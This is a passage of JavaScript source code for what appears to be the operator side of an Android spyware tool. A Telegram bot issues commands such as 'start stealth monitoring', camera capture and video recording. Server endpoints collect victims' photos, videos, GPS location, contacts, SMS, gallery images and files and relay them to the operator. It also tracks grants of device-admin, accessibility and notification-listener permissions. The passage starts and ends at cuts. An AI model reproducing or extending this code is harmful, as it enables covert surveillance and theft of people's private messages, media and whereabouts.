      "app_usage": { type: "monitoring", msg: "📱 Analyzing app usage patterns..." },
      "system_state": { type: "monitoring", msg: "📊 Reading system state..." },
      "input_patterns": { type: "monitoring", msg: "⌨️ Analyzing input patterns..." },
      "monitor_dashboard": { type: "stealth", msg: "📈 Loading monitor dashboard..." },
      "start_monitoring": { type: "stealth", msg: "🔄 Starting stealth monitoring..." },
      "stop_monitoring": { type: "stealth", msg: "⏹️ Stopping monitoring..." },
      
      // Enhanced Perfection Intelligence
      "network_intelligence": { type: "perfection", msg: "🌐 Analyzing network intelligence..." },
      "behavior_analysis": { type: "perfection", msg: "🧠 Processing behavior patterns..." },
      "sensor_intelligence": { type: "perfection", msg: "📡 Reading sensor intelligence..." },
      "system_intelligence": { type: "perfection", msg: "⚡ Analyzing system intelligence..." },
      "perfection_dashboard": { type: "perfection", msg: "📊 Loading perfection dashboard..." },
      "start_perfection": { type: "perfection", msg: "🚀 Starting enhanced perfection..." },
      "stop_perfection": { type: "perfection", msg: "⏹️ Stopping perfection service..." }
    };
    
    // Check if it's a direct command
    const cmdInfo = commandMap[data];
    if (cmdInfo) {
      await bot.answerCallbackQuery(id, { text: cmdInfo.msg });
      activeOperations.set(chatId, {
        type: cmdInfo.type,
        startTime: Date.now(),
        device: session.selectedDevice
      });
      
      await showAnimatedLoading(chatId, msgId, cmdInfo.type, 500);
      
      await db.ref(devicePath).update({
        command: data,
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
    }
    
    // Handle other command patterns
    const isCommand = data.startsWith("capture_") || 
                     data.startsWith("rec_") ||
                     data.startsWith("file_") || 
                     data.startsWith("filepage_") || 
                     data.startsWith("fileget_") ||
                     data.startsWith("gallery_") ||
                     data.startsWith("gopics_");
    
    if (isCommand) {
      await bot.answerCallbackQuery(id, { text: "⏳ Processing..." });
      
      const type = data.startsWith("gallery_") || data.startsWith("gopics_") ? "gallery" : "files";
      activeOperations.set(chatId, {
        type,
        startTime: Date.now(),
        device: session.selectedDevice
      });
      
      await showAnimatedLoading(chatId, msgId, type, 400);
      
      // Store last command for refresh functionality
      session.lastCommand = data;
      
      await db.ref(devicePath).update({
        command: data,
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
    }
    
    // Handle recording duration menu
    if (data === "rec_front" || data === "rec_back") {
      const side = data.slice(4);
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*⏱️ Recording Duration*\n\n" +
        "Select video duration:\n\n" +
        "_Videos are uploaded automatically after recording_\n" +
        "_Progress will be shown during upload_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {text:"⏱️ 30 seconds", callback_data:`rec_${side}_00.5`},
                {text:"⏱️ 1 minute", callback_data:`rec_${side}_01`}
              ],
              [
                {text:"⏱️ 2 minutes", callback_data:`rec_${side}_02`},
                {text:"⏱️ 5 minutes", callback_data:`rec_${side}_05`}
              ],
              [{ text:"🔙 Back", callback_data:`cam_${side}` }]
            ]
          }
        }
      );
      return;
    }
    
    /* ── Gallery Custom Count ───────────────────── */
    if (data.startsWith("gallery_custom_")) {
      await bot.answerCallbackQuery(id);
      const label = data.replace("gallery_custom_","");
      const prompt = await bot.sendMessage(chatId,
        `*📸 Gallery Request*\n\n` +
        `How many *${label}* images? (1-200):`,
        {
          parse_mode: "Markdown",
          reply_markup: { force_reply: true }
        }
      );
      awaitingCustom.set(chatId, {
        label,
        promptId: prompt.message_id,
        device: session.selectedDevice
      });
      return;
    }
    
    /* ── Refresh Current Command ────────────────────── */
    if (data === "refresh_current") {
      await bot.answerCallbackQuery(id, { text: "🔄 Refreshing..." });
      // Re-execute the last command if available
      const session = userSessions.get(chatId);
      if (session && session.lastCommand) {
        await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
          command: session.lastCommand,
          chat: chatId,
          msg: msgId,
          ts: Date.now()
        });
      } else {
        await bot.editMessageText(
          "*🔄 Refresh*\n\nNo previous command to refresh.",
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: getMainMenu(true)
          }
        );
      }
      return;
    }
    
    /* ── Default Handler ────────────────────────── */
    await bot.answerCallbackQuery(id);
    
  } catch (error) {
    console.error('Callback error:', error);
    await bot.answerCallbackQuery(id, {
      text: "❌ An error occurred. Please try again.",
      show_alert: true
    });
  }
});

/* ── Message Handler for Inputs ─────────────────── */
bot.on("message", async m => {
  if (!m.text) return;
  const chatId = m.chat.id;
  
  // Handle authentication
  const authState = awaitingAuth.get(chatId);
  if (authState && m.reply_to_message?.message_id === authState.messageId) {
    const key = m.text.trim();
    awaitingAuth.delete(chatId);
    
    // Delete the key message for security
    try {
      await bot.deleteMessage(chatId, m.message_id);
    } catch (e) {}
    
    // Show loading animation
    const loadingMsg = await bot.sendAnimation(chatId,
      'https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif',
      {
        caption: "*🔐 Authenticating...*\n\n_Verifying access key..._",
        parse_mode: 'Markdown'
      }
    );
    
    // Check if key exists in Firebase
    const devicesSnapshot = await db.ref(`devices/${key}`).once('value');
    if (devicesSnapshot.exists()) {
      userSessions.set(chatId, {
        key,
        selectedDevice: null,
        lastActivity: Date.now()
      });
      
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      
      await bot.sendAnimation(chatId, 
        'https://media.giphy.com/media/dWesBcTLavkZuG35MI/giphy.gif',
        {
          caption: "*✅ Authentication Successful*\n\n" +
                  `Welcome! Access granted.\n\n` +
                  "_Loading your devices..._",
          parse_mode: 'Markdown'
        }
      );
      
      setTimeout(() => showDeviceSelection(chatId), 2000);
    } else {
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      
      await bot.sendAnimation(chatId,
        'https://media.giphy.com/media/3ohzdQ1IynzclJldUQ/giphy.gif',
        {
          caption: "*❌ Authentication Failed*\n\n" +
                  "The access key is invalid.\n\n" +
                  "_Please check your secret\\_key.txt file_\n\n" +
                  "Use /start to try again.",
          parse_mode: 'Markdown'
        }
      );
    }
    return;
  }
  
  // Handle custom gallery count
  const customState = awaitingCustom.get(chatId);
  if (customState && m.reply_to_message?.message_id === customState.promptId) {
    const n = parseInt(m.text.trim(), 10);
    if (isNaN(n) || n < 1 || n > 200) {
      await bot.sendMessage(chatId, 
        "*❌ Invalid Number*\n\n" +
        "Please enter a number between *1-200*.\n\n" +
        "_Example: 50_",
        { 
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {text: "📁 Gallery", callback_data: "gallery_root"},
                {text: "🔙 Back", callback_data: "main_menu"}
              ]
            ]
          }
        }
      );
      return;
    }
    
    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) return;
    
    awaitingCustom.delete(chatId);
    
    const cmd = `gopics_${customState.label}_${n.toString().padStart(3,"0")}`;
    const statusMsg = await bot.sendMessage(chatId,
      `*📸 Gallery Upload Started*\n\n` +
      `📁 Folder: *${customState.label}*\n` +
      `📊 Count: *${n} images*\n\n` +
      `⚡ Processing at ultra-fast speed...\n` +
      `🔄 Progress will be shown in real-time`,
      { 
        parse_mode: "Markdown", 
        reply_markup: { 
          inline_keyboard: [
            [
              {text: "🔄 Check Status", callback_data: "refresh_current"},
              {text: "❌ Cancel", callback_data: "gallery_cancel"}
            ],
            [
              {text: "📁 Gallery", callback_data: "gallery_root"},
              {text: "🔙 Back", callback_data: "main_menu"}
            ]
          ]
        }
      }
    );
    
    await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
      command: cmd,
      chat: chatId,
      msg: statusMsg.message_id,
      ts: Date.now()
    });
  }
  
  // Handle file search
  if (m.text.startsWith("/search ")) {
    const session = userSessions.get(chatId);
    if (!session || !session.selectedDevice) {
      await bot.sendMessage(chatId, "Please login and select a device first.");
      return;
    }
    
    const query = m.text.replace("/search ", "").trim();
    if (query.length < 2) {
      await bot.sendMessage(chatId, "Search query must be at least 2 characters.");
      return;
    }
    
    const searchMsg = await bot.sendMessage(chatId,
      `*🔍 Searching Files*\n\n` +
      `Query: "${query}"\n\n` +
      `_Scanning device storage..._`,
      { parse_mode: 'Markdown' }
    );
    
    await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
      command: `filesearch_${query}`,
      chat: chatId,
      msg: searchMsg.message_id,
      ts: Date.now()
    });
  }
});

/* ── Enhanced Upload Endpoints ──────────────────── */

// Helper to extract device info
function getDeviceInfo(authHeader) {
  if (!authHeader) return null;
  
  const parts = authHeader.split(':');
  if (parts.length >= 2) {
    return { key: parts[0], deviceId: parts[1] };
  }
  return null;
}

// Helper to get active sessions for a key
function getActiveSessions(key) {
  return Array.from(userSessions.entries())
    .filter(([_, session]) => session.key === key)
    .map(([chatId, session]) => ({ chatId, session }));
}

/* 1) Photos with progress */
app.post("/capture", upload.single("photo"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) {
      console.log("Missing auth header");
      return res.sendStatus(403);
    }
    
    console.log(`Photo from ${deviceInfo.deviceId}`);
    
    const sessions = getActiveSessions(deviceInfo.key);
    if (sessions.length === 0) {
      res.json({ok: true, warning: "No active sessions"});
      fs.unlinkSync(req.file.path);
      return;
    }
    
    // Send to all active sessions
    for (const {chatId} of sessions) {
      try {
        const op = activeOperations.get(chatId);
        if (op && op.type === "photo") {
          activeOperations.delete(chatId);
        }
        
        await bot.sendPhoto(chatId, fs.readFileSync(req.file.path), {
          caption: `📸 *Photo Captured*\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n` +
                  `Time: ${new Date().toLocaleTimeString()}\n` +
                  `Quality: High`,
          parse_mode: 'Markdown'
        });
      } catch (e) {
        console.error(`Failed to send to ${chatId}:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Upload error:", error);
    res.status(500).json({error: error.message});
  } finally {
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
  }
});

/* 2) Videos with duration info */
app.post("/video", upload.single("video"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    if (sessions.length === 0) {
      res.json({ok: true});
      fs.unlinkSync(req.file.path);
      return;
    }
    
    const duration = req.body.duration || "Unknown";
    const fileSize = req.file.size;
    
    for (const {chatId} of sessions) {
      try {
        await bot.sendVideo(chatId, fs.readFileSync(req.file.path), {
          caption: `🎥 *Video Recorded Successfully*\n\n` +
                  `📱 Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n` +
                  `⏱️ Duration: ${duration}\n` +
                  `📊 Size: ${formatFileSize(fileSize)}\n` +
                  `🕒 Time: ${new Date().toLocaleTimeString()}\n\n` +
                  `✅ Upload completed successfully`,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: getBackMenuButtons("main_menu")
          }
        });
      } catch (e) {
        console.error(`Video send error:`, e.message);
        // Send error feedback to user
        try {
          await bot.sendMessage(chatId, 
            `❌ *Video Upload Failed*\n\n` +
            `Error: ${e.message}\n` +
            `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n\n` +
            `Please try recording again.`,
            { 
              parse_mode: 'Markdown',
              reply_markup: {
                inline_keyboard: getBackMenuButtons("main_menu")
              }
            }
          );
        } catch (err) {
          console.error("Failed to send error message:", err);
        }
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Video error:", error);
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 3) Enhanced location with map */
app.post("/json/location", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {lat, lon, accuracy, altitude, speed, type} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Send location pin
        await bot.sendLocation(chatId, lat, lon);
        
        // Send details
        let details = `📍 *Location Update*\n\n`;
        details += `Device: \`${deviceInfo.deviceId.slice(0,6)}\`\n`;
        details += `Type: ${type || 'single'}\n`;
        details += `Accuracy: ${accuracy ? Math.round(accuracy) + 'm' : 'Unknown'}\n`;
        
        if (altitude) details += `Altitude: ${Math.round(altitude)}m\n`;
        if (speed && speed > 0) details += `Speed: ${Math.round(speed * 3.6)}km/h\n`;
        
        details += `Time: ${new Date().toLocaleString()}\n\n`;
        details += `[View on Map](https://www.google.com/maps?q=${lat},${lon})`;
        
        await bot.sendMessage(chatId, details, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        
      } catch (e) {
        console.error(`Location error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 4) Text data endpoints - FIXED */
app.post("/text/contacts", express.text(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const contactData = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Split into chunks if too large
        const maxLength = 4000;
        if (contactData.length > maxLength) {
          const chunks = contactData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
          for (let i = 0; i < chunks.length; i++) {
            await bot.sendMessage(chatId, 
              `📱 *Contacts Export (Part ${i + 1}/${chunks.length})*\n\n` +
              `\`\`\`\n${chunks[i]}\n\`\`\``,
              { parse_mode: 'Markdown' }
            );
          }
        } else {
          await bot.sendMessage(chatId,
            `📱 *Contacts Export*\n\n` +
            `\`\`\`\n${contactData}\n\`\`\``,
            { parse_mode: 'Markdown' }
          );
        }
      } catch (e) {
        console.error(`Contacts send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

app.post("/text/sms", express.text(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const smsData = req.body;
    
    for (const {chatId} of sessions) {
      try {
        // Split into chunks if too large
        const maxLength = 4000;
        if (smsData.length > maxLength) {
          const chunks = smsData.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
          for (let i = 0; i < chunks.length; i++) {
            await bot.sendMessage(chatId, 
              `💬 *SMS Export (Part ${i + 1}/${chunks.length})*\n\n` +
              `\`\`\`\n${chunks[i]}\n\`\`\``,
              { parse_mode: 'Markdown' }
            );
          }
        } else {
          await bot.sendMessage(chatId,
            `💬 *SMS Export*\n\n` +
            `\`\`\`\n${smsData}\n\`\`\``,
            { parse_mode: 'Markdown' }
          );
        }
      } catch (e) {
        console.error(`SMS send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 5) File upload endpoint - FIXED */
app.post("/file", upload.single("blob"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {name, size, modified} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        await bot.sendDocument(chatId, fs.readFileSync(req.file.path), {
          caption: `📄 *File Downloaded*\n\n` +
                  `Name: ${name}\n` +
                  `Size: ${size}\n` +
                  `Modified: ${modified}\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
          parse_mode: 'Markdown'
        }, {
          filename: name
        });
      } catch (e) {
        console.error(`File send error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 6) Enhanced file listing */
app.post("/json/filelist", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type} = req.body;
    
    // Handle different types of file responses
    if (type === "quick_access") {
      const {items} = req.body;
      const rows = items.map(item => [{
        text: item.name,
        callback_data: `file_${item.path}`
      }]);
      
      rows.push([
        {text: "📂 All Files", callback_data: "file_root"},
        {text: "🔙 Back", callback_data: "file_menu"}
      ]);
      
      await bot.editMessageText(
        "*⚡ Quick Access*\n\n" +
        "Popular folders:",
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: rows }
        }
      );
    }
    else if (type === "directory_list") {
      const {base, page, total, items, path_display, item_count} = req.body;
      
      // Create file/folder buttons
      const rows = items.map(item => {
        const text = `${item.icon} ${item.name}${item.size ? ' (' + item.size + ')' : ''}`;
        return [{
          text: text.slice(0, 60),
          callback_data: item.dir ? `file_${item.path}` : `fileget_${item.path}`
        }];
      });
      
      // Add navigation
      const nav = [];
      if (total > 1) {
        if (page > 0) nav.push({text: "⏮️ Prev", callback_data: `filepage_${base}_${page-1}`});
        nav.push({text: `📄 ${page+1}/${total}`, callback_data: "noop"});
        if (page < total-1) nav.push({text: "Next ⏭️", callback_data: `filepage_${base}_${page+1}`});
      }
      if (nav.length) rows.push(nav);
      
      // Add controls
      const controls = [];
      if (base !== "root") controls.push({text: "⬆️ Up", callback_data: `file_${parent(base)}`});
      controls.push({text: "🏠 Root", callback_data: "file_root"});
      controls.push({text: "🔙 Menu", callback_data: "file_menu"});
      rows.push(controls);
      
      await bot.editMessageText(
        `*📂 File Explorer*\n\n` +
        `📍 ${path_display}\n` +
        `📊 ${item_count} items (${items.length} shown)\n\n` +
        `_Tap to open files/folders_`,
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: rows }
        }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Filelist error:", error);
    res.status(500).json({error: error.message});
  }
});

/* 7) Storage info display */
app.post("/json/storage_info", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, total, used, available, percent_used} = req.body;
    
    // Create visual storage bar
    const barLength = 20;
    const filledLength = Math.round((percent_used / 100) * barLength);
    const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);
    
    await bot.editMessageText(
      `*💾 Storage Information*\n\n` +
      `\`${bar}\` ${percent_used}%\n\n` +
      `📊 *Total:* ${total}\n` +
      `📈 *Used:* ${used}\n` +
      `📉 *Free:* ${available}\n\n` +
      `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
      {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "file_storage"},
            {text: "🔙 Back", callback_data: "file_menu"}
          ]]
        }
      }
    );
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 8) Gallery count with preview */
app.post("/json/gallerycount", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, folder, total, previews} = req.body;
    const lbl = folder.toLowerCase();
    
    let message = `*📸 ${folder} Gallery*\n\n`;
    message += `Total images: *${total}*\n\n`;
    
    if (previews && previews.length > 0) {
      message += `_Preview available_\n\n`;
    }
    
    message += `Select amount to retrieve:`;
    
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {text: "📸 Latest 10", callback_data: `gopics_${lbl}_010`},
            {text: "📸 Latest 25", callback_data: `gopics_${lbl}_025`}
          ],
          [
            {text: "📸 Latest 50", callback_data: `gopics_${lbl}_050`},
            {text: "📸 Latest 100", callback_data: `gopics_${lbl}_100`}
          ],
          [
            {text: "⚙️ Custom Amount", callback_data: `gallery_custom_${lbl}`}
          ],
          [
            {text: "🔙 Back to Gallery", callback_data: "gallery_root"}
          ]
        ]
      }
    });
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 9) Gallery photo with progress */
app.post("/gallery/photo", upload.single("img"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {folder, current, total} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        const progress = total ? `[${current}/${total}]` : '';
        await bot.sendPhoto(chatId, fs.readFileSync(req.file.path), {
          caption: `📸 *Gallery Upload* ${progress}\n` +
                  `Folder: ${folder || 'Unknown'}\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
          parse_mode: 'Markdown'
        });
      } catch (e) {
        console.error(`Gallery photo error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 10) Status updates */
app.post("/json/gallery_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, type, message, count, folder, error} = req.body;
    
    if (type === "upload_complete") {
      await sendSuccess(chat_id, `✅ *Upload Complete*\n\nSuccessfully sent ${count} images from ${folder}\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\``);
    } else if (type === "error") {
      await sendError(chat_id, `❌ *Error*\n\n${error}`);
    } else if (type === "status") {
      await sendSuccess(chat_id, `ℹ️ *Status Update*\n\n${message}`);
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 11) File status endpoint */
app.post("/json/file_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, type, message, error} = req.body;
    
    if (type === "error") {
      await sendError(chat_id, `❌ *File Operation Error*\n\n${error}`);
    } else if (type === "status") {
      await sendSuccess(chat_id, `ℹ️ ${message}`);
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 12) JSON status/error endpoints */
app.post("/json/status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {status} = req.body;
    
    for (const {chatId} of sessions) {
      await sendSuccess(chatId, `ℹ️ *Status Update*\n\n${status}`);
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

app.post("/json/error", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {error} = req.body;
    
    for (const {chatId} of sessions) {
      await sendError(chatId, `❌ *Error*\n\n${error}`);
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 13) Permission checker response */
app.post("/json/permissions", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, permissions} = req.body;
    
    // Calculate permission statistics
    const totalPermissions = Object.keys(permissions).length;
    const grantedPermissions = Object.values(permissions).filter(Boolean).length;
    const deniedPermissions = totalPermissions - grantedPermissions;
    const permissionPercentage = Math.round((grantedPermissions / totalPermissions) * 100);
    
    let message = "*🔐 Device Permission Status*\n\n";
    
    // Add timestamp to ensure message is always different
    const timestamp = new Date().toLocaleTimeString();
    message += `_Last updated: ${timestamp}_\n\n`;
    
    // Show permission summary
    message += `📊 *Permission Summary:*\n`;
    message += `✅ Granted: ${grantedPermissions}/${totalPermissions} (${permissionPercentage}%)\n`;
    message += `❌ Denied: ${deniedPermissions}/${totalPermissions}\n\n`;
    
    // Show progress bar
    const progressBar = "█".repeat(Math.floor(permissionPercentage / 10)) + "░".repeat(10 - Math.floor(permissionPercentage / 10));
    message += `Progress: [${progressBar}] ${permissionPercentage}%\n\n`;
    
    const permissionEmojis = {
      camera: "📸",
      location_fine: "📍",
      location_coarse: "📍",
      contacts: "📱",
      sms: "💬",
      storage_read: "📂",
      storage_write: "📂",
      phone: "📞",
      microphone: "🎤",
      notifications: "🔔",
      all_files_access: "📁",
      overlay: "🖼️",
      device_admin: "⚙️",
      accessibility: "♿",
      notification_listener: "🔔",
      call_log: "📞",
      calendar: "📅"
    };
    
    // Map permission names to display names
    const permissionDisplayNames = {
      camera: "Camera",
      location_fine: "Location (Fine)",
      location_coarse: "Location (Coarse)",
      contacts: "Contacts",
      sms: "SMS",
      storage_read: "Storage Read",
      storage_write: "Storage Write",
      phone: "Phone",
      microphone: "Microphone",
      notifications: "Notifications",
      all_files_access: "All Files Access",
      overlay: "Overlay",
      device_admin: "Device Admin",
      accessibility: "Accessibility",
      notification_listener: "Notification Listener",
      call_log: "Call Log",
      calendar: "Calendar"
    };
    
    // Debug: Log the raw permissions object
    console.log("Raw permissions received:", JSON.stringify(permissions, null, 2));
    
    // Separate granted and denied permissions
    const grantedPerms = [];
    const deniedPerms = [];
    
    Object.entries(permissions).forEach(([perm, isGranted]) => {
      const emoji = permissionEmojis[perm] || "❓";
      const displayName = permissionDisplayNames[perm] || perm;
      if (isGranted) {
        grantedPerms.push(`${emoji} ${displayName}`);
      } else {
        deniedPerms.push(`${emoji} ${displayName}`);
      }
    });
    
    // Show denied permissions first (more important)
    if (deniedPerms.length > 0) {
      message += `❌ *Missing Permissions:*\n`;
      deniedPerms.forEach(perm => {
        message += `• ${perm}\n`;
      });
      message += `\n`;
    }
    
    // Show granted permissions
    if (grantedPerms.length > 0) {
      message += `✅ *Granted Permissions:*\n`;
      grantedPerms.forEach(perm => {
        message += `• ${perm}\n`;
      });
      message += `\n`;
    }
    
    message += `_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    
    try {
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{text: "🔄 Refresh Status", callback_data: "check_permissions"}],
          [{text: "🔙 Back to Menu", callback_data: "permissions_menu"}]
        ]
      }
    });
    } catch (editError) {
      // Handle "message is not modified" error gracefully
      if (editError.description && editError.description.includes("message is not modified")) {
        console.log("Message content unchanged - this is normal for refresh");
        // Don't throw error, just log it
        return;
      } else {
        console.error("Error editing message:", editError);
        throw editError; // Re-throw other errors
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* ── Permission Request Response ────────────────── */
app.post("/json/permission_request", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type, status, message, missing_permissions, permission_names, total_missing} = req.body;
    
    if (type !== "permission_request") {
      return res.status(400).json({error: "Invalid type"});
    }
    
    let responseMessage = message || "";
    
    // Add device info to the message
    responseMessage += `\n\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    
    // Create appropriate keyboard based on status
    let keyboard;
    if (status === "all_granted") {
      keyboard = {
        inline_keyboard: [
          [{text: "✅ All Set!", callback_data: "main_menu"}],
          [{text: "🔐 Check Again", callback_data: "check_permissions"}]
        ]
      };
    } else if (status === "missing_permissions") {
      keyboard = {
        inline_keyboard: [
          [{text: "🔐 Check Permissions", callback_data: "check_permissions"}],
          [{text: "🔄 Refresh Status", callback_data: "check_permissions"}],
          [{text: "🔙 Back to Menu", callback_data: "permissions_menu"}]
        ]
      };
    } else {
      keyboard = {
        inline_keyboard: [
          [{text: "🔐 Check Permissions", callback_data: "check_permissions"}],
          [{text: "🔙 Back", callback_data: "main_menu"}]
        ]
      };
    }
    
    try {
      await bot.editMessageText(responseMessage, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
    } catch (editError) {
      if (editError.description && editError.description.includes("message is not modified")) {
        console.log("Message content unchanged - this is normal for refresh");
        return;
      } else {
        console.error("Error editing message:", editError);
        throw editError;
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* ── Utility Functions ──────────────────────────── */
function formatFileSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

/* ── Message Sending Functions ──────────────────── */
async function sendSuccess(chatId, message) {
  try {
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error sending success message:', error);
  }
}

async function sendError(chatId, message) {
  try {
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error sending error message:', error);
  }
}

/* 14) Device Status endpoints */
app.post("/json/device_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type} = req.body;
    
    if (type === "battery_status") {
      const {battery} = req.body;
      
      // Create battery visual
      const batteryBar = getBatteryVisual(battery.percentage);
      
      await bot.editMessageText(
        `*🔋 Battery Status*\n\n` +
        `${batteryBar}\n\n` +
        `📊 *Level:* ${battery.percentage}%\n` +
        `⚡ *Status:* ${battery.status}\n` +
        `🔌 *Power Source:* ${battery.power_source}\n` +
        `🌡️ *Temperature:* ${battery.temperature}\n` +
        `⚡ *Voltage:* ${battery.voltage}\n\n` +
